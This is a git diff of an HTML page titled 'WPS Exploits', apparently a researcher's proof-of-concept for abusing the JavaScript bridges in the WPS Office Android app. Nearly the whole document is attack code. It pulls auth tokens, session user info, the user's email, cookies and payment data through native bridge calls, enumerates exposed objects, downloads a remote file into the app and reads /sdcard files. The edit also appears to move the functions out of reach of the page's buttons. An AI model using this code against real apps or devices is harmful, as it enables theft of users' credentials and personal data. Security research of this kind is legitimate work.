@@ -28,260 +28,268 @@ requestSessionUserInfo
 shareWx
 startTask
  -->
+
 <head>
     <script type="text/javascript">
-        var string = "";
 
-        //APPS JS CALLBACKS
-        function loginCallback() {
-            try {
-                document.getElementById("myP").innerHTML = splash.goToLoginAndCallBackUserInfo()
-            } catch (error) {
-                document.getElementById("myP").innerHTML = error;
-            }
-        }
-        function appJs_loginCallback(x, y) {
-            try {
-                document.getElementById("myP").innerHTML = x + "\n\n" + y;
-            } catch (error) {
-                document.getElementById("myP").innerHTML = error;
-            }
-        }
-        
+        document.addEventListener("DOMContentLoaded", function () {
+            var string = "";
 
-        function loginCallbackAuthToken() {
-            splash.goToLoginAndCallBackUserInfo()
-            try {
-                document.getElementById("myP").innerHTML = splash.goToLoginAndCallBack()
-            } catch (error) {
-                document.getElementById("myP").innerHTML = error;
-            }
-        }
-        function appJs_loginCallback(x) {
-            try {
-                document.getElementById("myP").innerHTML = x;
-            } catch (error) {
-                document.getElementById("myP").innerHTML = error;
-            }
-        }
-
-
-        function requestSess() {
-            try {
-                document.getElementById("myP").innerHTML = splash.requestSession();
-            } catch (error) {
-                document.getElementById("myP").innerHTML = error;
-            }
-        }
-        function appJs_sessionCallback(x) {
-            try {
-                document.getElementById("myP").innerHTML = x;
-            } catch (error) {
-                document.getElementById("myP").innerHTML = error;
-            }
-        }
-
-
-        function requestSessUserInfo() {
-            try {
-                document.getElementById("myP").innerHTML = "CALLING NOW!";
-                document.getElementById("myP").innerHTML += getObj(splash);
-                document.getElementById("myP").innerHTML += splash.requestSessionUserInfo();
-                document.getElementById("myP").innerHTML += qing.requestSessionUserInfo();
-                document.getElementById("myP").innerHTML += "OMG IM HERE NOW!"
-            } catch (error) {
-                document.getElementById("myP").innerHTML += "ERROR HERE\n"+error;
-            }
-        }
-        function appJs_sessionCallback(x, y) {
-            try {
-                document.getElementById("myP").innerHTML += "NOPE  I AM NOW HERE@"
-                document.getElementById("myP").innerHTML += x + "\n\n" + y;
-            } catch (error) {
-                document.getElementById("myP").innerHTML = error;
-            }
-        }
-
-        
-
-        
-
-
-        //used function
-
-        function findAllVariables() {
-            for (let variable in window) {
-                if (window.hasOwnProperty(variable)) {
-
-                    var ul = document.getElementById("list");
-                    var li = document.createElement("li");
-                    li.className = "list-group-item"
-                    li.appendChild(document.createTextNode(variable));
-                    ul.appendChild(li);
+            //APPS JS CALLBACKS
+            function loginCallback() {
+                try {
+                    document.getElementById("myP").innerHTML = splash.goToLoginAndCallBackUserInfo()
+                } catch (error) {
+                    document.getElementById("myP").innerHTML = error;
                 }
             }
-            // = string;
-        }
-
-        function getMethodsNames(obj) {
-            return Object.keys(obj)
-                .filter((key) => typeof obj[key] === 'function');
-        }
-
-        // Get the Object's methods (functions):
-        function getMethods(obj) {
-            return Object.keys(obj)
-                .filter((key) => typeof obj[key] === 'function')
-                .map((key) => obj[key]);
-        }
-
-
-        function getObj(obj) {
-            try {
-                document.getElementById("myP").innerHTML = getMethodsNames(obj);
-            } catch (error) {
-                document.getElementById("myP").innerHTML = error;
+            function appJs_loginCallback(x, y) {
+                try {
+                    document.getElementById("myP").innerHTML = x + "\n\n" + y;
+                } catch (error) {
+                    document.getElementById("myP").innerHTML = error;
+                }
             }
-        }
 
-        function call() {
-            try {
-                document.getElementById("myP").innerHTML = splash.JSGetClientInfo();
-            } catch (error) {
-                document.getElementById("myP").innerHTML = error;
+
+            function loginCallbackAuthToken() {
+                splash.goToLoginAndCallBackUserInfo()
+                try {
+                    document.getElementById("myP").innerHTML = splash.goToLoginAndCallBack()
+                } catch (error) {
+                    document.getElementById("myP").innerHTML = error;
+                }
             }
-        }
-
-        function showToastJS() {
-            try {
-                //qing.JSShowToast("test 1");
-                //splash.JSShowToast("test 2");
-                WpsJSOverseaBridge.JSShowToast("Hey I just showed a custom toast that is coded in Java in your app!! RCE is fun");
-                //string.JSShowToast("test 4");
-            } catch (error) {
-                document.getElementById("myP").innerHTML = error;
+            function appJs_loginCallback(x) {
+                try {
+                    document.getElementById("myP").innerHTML = x;
+                } catch (error) {
+                    document.getElementById("myP").innerHTML = error;
+                }
             }
-        }
 
 
-        function getUserMail() {
-            try {
-                document.getElementById("myP").innerHTML = splash.jsGetUserMail();
-            } catch (error) {
-                document.getElementById("myP").innerHTML = error;
+            function requestSess() {
+                try {
+                    document.getElementById("myP").innerHTML = splash.requestSession();
+                } catch (error) {
+                    document.getElementById("myP").innerHTML = error;
+                }
             }
-        }
-
-        function getCookies() {
-            try {
-                document.getElementById("myP").innerHTML = document.cookie;
-            } catch (error) {
-                document.getElementById("myP").innerHTML = error;
+            function appJs_sessionCallback(x) {
+                try {
+                    document.getElementById("myP").innerHTML = x;
+                } catch (error) {
+                    document.getElementById("myP").innerHTML = error;
+                }
             }
-        }
 
 
-        //TEST FUNCTIONS
-        function trackingInfo() {
-            try {
-                document.getElementById("myP").innerHTML = splash.trackingInfo("wps_sid");
-            } catch (error) {
-                document.getElementById("myP").innerHTML = error;
+            function requestSessUserInfo() {
+                try {
+                    document.getElementById("myP").innerHTML = "CALLING NOW!";
+                    document.getElementById("myP").innerHTML += getObj(splash);
+                    document.getElementById("myP").innerHTML += splash.requestSessionUserInfo();
+                    document.getElementById("myP").innerHTML += qing.requestSessionUserInfo();
+                    document.getElementById("myP").innerHTML += "OMG IM HERE NOW!"
+                } catch (error) {
+                    document.getElementById("myP").innerHTML += "ERROR HERE\n" + error;
+                }
             }
-        }
-
-        function tryDownload() {
-            try {
-                document.getElementById("myP").innerHTML = splash.JSDownload("random", "https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/testFINDME.txt")
-                // document.getElementById("myP").innerHTML += splash.download("https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/test.txt","./")
-                // document.getElementById("myP").innerHTML += splash.download("/sdcard","https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/test.txt")
-                // document.getElementById("myP").innerHTML += splash.download("./","https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/test.txt")
-            } catch (error) {
-                document.getElementById("myP").innerHTML = error;
+            function appJs_sessionCallback(x, y) {
+                try {
+                    document.getElementById("myP").innerHTML += "NOPE  I AM NOW HERE@"
+                    document.getElementById("myP").innerHTML += x + "\n\n" + y;
+                } catch (error) {
+                    document.getElementById("myP").innerHTML = error;
+                }
             }
-        }
 
-        
-        function testGetFile() {
-            try {
-                document.getElementById("myP").innerHTML = splash.jsOpenFile("/sdcard/test", "{\"phonetype\":\"N95\",\"cat\":\"WP\"}", "txt")
-            } catch (error) {
-                document.getElementById("myP").innerHTML = error;
-            }
-        }
 
-        function JSGetPaymentWay() {
-            try {
-                document.getElementById("myP").innerHTML = splash.JSGetPaymentWay()
-            } catch (error) {
-                document.getElementById("myP").innerHTML = error;
-            }
-        }
 
-        function JSIntentSchemeURI() {
-            try {
-                document.getElementById("myP").innerHTML = splash.JSIntentSchemeURI("https://bing.com", 2);
-            } catch (error) {
-                document.getElementById("myP").innerHTML = error;
-            }
-        }
 
-        function shareWx() {
-            try {
-                document.getElementById("myP").innerHTML = splash.shareWx("https://bing.com", "https://bing.com");
-            } catch (error) {
-                document.getElementById("myP").innerHTML = error;
-            }
-        }
 
-        function startTask() {
-            try {
-                document.getElementById("myP").innerHTML = splash.startTask("https://bing.com");
-            } catch (error) {
-                document.getElementById("myP").innerHTML = error;
-            }
-        }
 
-        function printShit(){
-            try {
-                document.getElementById("myP").innerHTML = "START\n";
-                document.getElementById("myP").innerHTML += "wpsCreateFunction: "+JSON.stringify(wpsCreateFunction)+"\n\n"
-                document.getElementById("myP").innerHTML += "wpsS2i: "+JSON.stringify(wpsS2i)+"\n\n"
-                document.getElementById("myP").innerHTML += "wpsVersionCmp: "+JSON.stringify(wpsVersionCmp)+"\n\n"
-                document.getElementById("myP").innerHTML += "SDKVersion: "+JSON.stringify(SDKVersion)+"\n\n"
-                document.getElementById("myP").innerHTML += "WpsPlatformType: "+JSON.stringify(WpsPlatformType)+"\n\n"
-                document.getElementById("myP").innerHTML += "wpsSdkRegister: "+JSON.stringify(wpsSdkRegister)+"\n\n"
-                document.getElementById("myP").innerHTML += "_listeners: "+JSON.stringify(_listeners)+"\n\n"
-                document.getElementById("myP").innerHTML += "wpsBridgeEvent: "+JSON.stringify(wpsBridgeEvent)+"\n\n"
-                document.getElementById("myP").innerHTML += "Invoker: "+JSON.stringify(Invoker)+"\n\n"
-                document.getElementById("myP").innerHTML += "wps: "+JSON.stringify(wps)+"\n\n"
-                document.getElementById("myP").innerHTML += "__wpsoffice_environment: "+JSON.stringify(__wpsoffice_environment)+"\n\n"
-                document.getElementById("myP").innerHTML += "owWps: "+JSON.stringify(owWps)+"\n\n"
-                document.getElementById("myP").innerHTML += "canIUseApis: "+JSON.stringify(canIUseApis)+"\n\n"
-                document.getElementById("myP").innerHTML += "__wpsoffice_app_ver: "+JSON.stringify(__wpsoffice_app_ver)+"\n\n"
-            } catch (error) {
-                document.getElementById("myP").innerHTML = error;
-            }
-            
-        }
+            //used function
 
-        function printShit2(){
-            try {
-                document.getElementById("myP").innerHTML = "START 2\n";
-                document.getElementById("myP").innerHTML += "wps: "+getMethodsNames(wps)+"\n"
-                document.getElementById("myP").innerHTML += "owWps: "+getMethodsNames(owWps)+"\n"
-                document.getElementById("myP").innerHTML += "canIUseApis: "+getMethodsNames(canIUseApis)+"\n"
-                document.getElementById("myP").innerHTML += "wps Call get userinfo: "+wps.getUserInfo()+"\n"
-                document.getElementById("myP").innerHTML += "wps Call getTargetUserInfo: "+wps.getTargetUserInfo()+"\n"
-            } catch (error) {
-                document.getElementById("myP").innerHTML = error;
+            function findAllVariables() {
+                for (let variable in window) {
+                    if (window.hasOwnProperty(variable)) {
+
+                        var ul = document.getElementById("list");
+                        var li = document.createElement("li");
+                        li.className = "list-group-item"
+                        li.appendChild(document.createTextNode(variable));
+                        ul.appendChild(li);
+                    }
+                }
+                // = string;
             }
-        }
+
+            function getMethodsNames(obj) {
+                return Object.keys(obj)
+                    .filter((key) => typeof obj[key] === 'function');
+            }
+
+            // Get the Object's methods (functions):
+            function getMethods(obj) {
+                return Object.keys(obj)
+                    .filter((key) => typeof obj[key] === 'function')
+                    .map((key) => obj[key]);
+            }
+
+
+            function getObj(obj) {
+                try {
+                    document.getElementById("myP").innerHTML = getMethodsNames(obj);
+                } catch (error) {
+                    document.getElementById("myP").innerHTML = error;
+                }
+            }
+
+            function call() {
+                try {
+                    document.getElementById("myP").innerHTML = splash.JSGetClientInfo();
+                } catch (error) {
+                    document.getElementById("myP").innerHTML = error;
+                }
+            }
+
+            function showToastJS() {
+                try {
+                    //qing.JSShowToast("test 1");
+                    //splash.JSShowToast("test 2");
+                    WpsJSOverseaBridge.JSShowToast("Hey I just showed a custom toast that is coded in Java in your app!! RCE is fun");
+                    //string.JSShowToast("test 4");
+                } catch (error) {
+                    document.getElementById("myP").innerHTML = error;
+                }
+            }
+
+
+            function getUserMail() {
+                try {
+                    document.getElementById("myP").innerHTML = splash.jsGetUserMail();
+                } catch (error) {
+                    document.getElementById("myP").innerHTML = error;
+                }
+            }
+
+            function getCookies() {
+                try {
+                    document.getElementById("myP").innerHTML = document.cookie;
+                } catch (error) {
+                    document.getElementById("myP").innerHTML = error;
+                }
+            }
+
+
+            //TEST FUNCTIONS
+            function trackingInfo() {
+                try {
+                    document.getElementById("myP").innerHTML = splash.trackingInfo("wps_sid");
+                } catch (error) {
+                    document.getElementById("myP").innerHTML = error;
+                }
+            }
+
+            function tryDownload() {
+                try {
+                    document.getElementById("myP").innerHTML = splash.JSDownload("random", "https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/testFINDME.txt")
+                    // document.getElementById("myP").innerHTML += splash.download("https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/test.txt","./")
+                    // document.getElementById("myP").innerHTML += splash.download("/sdcard","https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/test.txt")
+                    // document.getElementById("myP").innerHTML += splash.download("./","https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/test.txt")
+                } catch (error) {
+                    document.getElementById("myP").innerHTML = error;
+                }
+            }
+
+
+            function testGetFile() {
+                try {
+                    document.getElementById("myP").innerHTML = splash.jsOpenFile("/sdcard/test", "{\"phonetype\":\"N95\",\"cat\":\"WP\"}", "txt")
+                } catch (error) {
+                    document.getElementById("myP").innerHTML = error;
+                }
+            }
+
+            function JSGetPaymentWay() {
+                try {
+                    document.getElementById("myP").innerHTML = splash.JSGetPaymentWay()
+                } catch (error) {
+                    document.getElementById("myP").innerHTML = error;
+                }
+            }
+
+            function JSIntentSchemeURI() {
+                try {
+                    document.getElementById("myP").innerHTML = splash.JSIntentSchemeURI("https://bing.com", 2);
+                } catch (error) {
+                    document.getElementById("myP").innerHTML = error;
+                }
+            }
+
+            function shareWx() {
+                try {
+                    document.getElementById("myP").innerHTML = splash.shareWx("https://bing.com", "https://bing.com");
+                } catch (error) {
+                    document.getElementById("myP").innerHTML = error;
+                }
+            }
+
+            function startTask() {
+                try {
+                    document.getElementById("myP").innerHTML = splash.startTask("https://bing.com");
+                } catch (error) {
+                    document.getElementById("myP").innerHTML = error;
+                }
+            }
+
+            function printShit() {
+                try {
+                    document.getElementById("myP").innerHTML = "START\n";
+                    document.getElementById("myP").innerHTML += "wpsCreateFunction: " + JSON.stringify(wpsCreateFunction) + "\n\n"
+                    document.getElementById("myP").innerHTML += "wpsS2i: " + JSON.stringify(wpsS2i) + "\n\n"
+                    document.getElementById("myP").innerHTML += "wpsVersionCmp: " + JSON.stringify(wpsVersionCmp) + "\n\n"
+                    document.getElementById("myP").innerHTML += "SDKVersion: " + JSON.stringify(SDKVersion) + "\n\n"
+                    document.getElementById("myP").innerHTML += "WpsPlatformType: " + JSON.stringify(WpsPlatformType) + "\n\n"
+                    document.getElementById("myP").innerHTML += "wpsSdkRegister: " + JSON.stringify(wpsSdkRegister) + "\n\n"
+                    document.getElementById("myP").innerHTML += "_listeners: " + JSON.stringify(_listeners) + "\n\n"
+                    document.getElementById("myP").innerHTML += "wpsBridgeEvent: " + JSON.stringify(wpsBridgeEvent) + "\n\n"
+                    document.getElementById("myP").innerHTML += "Invoker: " + JSON.stringify(Invoker) + "\n\n"
+                    document.getElementById("myP").innerHTML += "wps: " + JSON.stringify(wps) + "\n\n"
+                    document.getElementById("myP").innerHTML += "__wpsoffice_environment: " + JSON.stringify(__wpsoffice_environment) + "\n\n"
+                    document.getElementById("myP").innerHTML += "owWps: " + JSON.stringify(owWps) + "\n\n"
+                    document.getElementById("myP").innerHTML += "canIUseApis: " + JSON.stringify(canIUseApis) + "\n\n"
+                    document.getElementById("myP").innerHTML += "__wpsoffice_app_ver: " + JSON.stringify(__wpsoffice_app_ver) + "\n\n"
+                } catch (error) {
+                    document.getElementById("myP").innerHTML = error;
+                }
+
+            }
+
+            function printShit2() {
+                try {
+                    document.getElementById("myP").innerHTML = "START 2\n";
+                    document.getElementById("myP").innerHTML += "wps: " + getMethodsNames(wps) + "\n"
+                    document.getElementById("myP").innerHTML += "owWps: " + getMethodsNames(owWps) + "\n"
+                    document.getElementById("myP").innerHTML += "canIUseApis: " + getMethodsNames(canIUseApis) + "\n"
+                    document.getElementById("myP").innerHTML += "wps Call get userinfo: " + wps.getUserInfo() + "\n"
+                    document.getElementById("myP").innerHTML += "wps Call getTargetUserInfo: " + wps.getTargetUserInfo() + "\n"
+                } catch (error) {
+                    document.getElementById("myP").innerHTML = error;
+                }
+            }
+            //....
+        });
     </script>
+
+
 </head>
+
 <body>
-    <h1>WPS Exploits!!</h1>
-  
+    <h1>WPS Exploits!!!</h1>
+
 
     <button onclick="findAllVariables()">
         List all values in the DOM
@@ -307,7 +315,7 @@ startTask
     <button onclick="getObj(wpsAndroidBridge)">
         Get WpsBRIDGE
     </button>
-    
+
     <button onclick="wpsAndroidBridge.init()">
         Init WpsBRIDGE
     </button>
@@ -345,7 +353,7 @@ startTask
 
     <br>
     <button onclick="loginCallbackAuthToken()">
-        Call login and get Auth token  - Native Function"
+        Call login and get Auth token - Native Function"
     </button>
 
 
@@ -412,7 +420,7 @@ startTask
 
 
 
-    
+
 
 
     <p id="myP">
